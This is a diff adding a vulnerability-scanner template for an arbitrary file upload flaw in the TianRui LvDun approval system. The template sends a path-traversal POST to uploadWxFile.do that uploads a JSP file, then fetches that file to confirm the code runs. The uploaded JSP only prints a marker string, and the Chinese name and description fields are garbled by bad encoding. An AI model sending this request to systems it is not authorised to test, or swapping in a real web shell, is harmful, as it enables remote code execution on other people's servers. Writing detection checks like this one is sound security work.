@@ -1,0 +1,45 @@
+id: TianRui-LvDun-UploadWxFile-RCE
+
+info:
+  name: 澶╅攼缁跨浘瀹℃壒绯荤粺-uploadWxFile.do-浠绘剰鏂囦欢涓婁紶
+  author: X1ly?S
+  severity: critical
+  description: 澶╅攼缁跨浘瀹℃壒绯荤粺-uploadWxFile.do-浠绘剰鏂囦欢涓婁紶瀵艰嚧RCE
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/../config/uploadWxFile.do HTTP/1.1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynvgfpfpm
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+        ------WebKitFormBoundarynvgfpfpm
+        Content-Disposition:form-data;name="file";filename="sectestsectest.jsp"
+        Content-Type:application/octet-stream
+
+        <%out.print("sectestsectest");%>
+        ------WebKitFormBoundarynvgfpfpm--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/sectestsectest.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "sectestsectest"
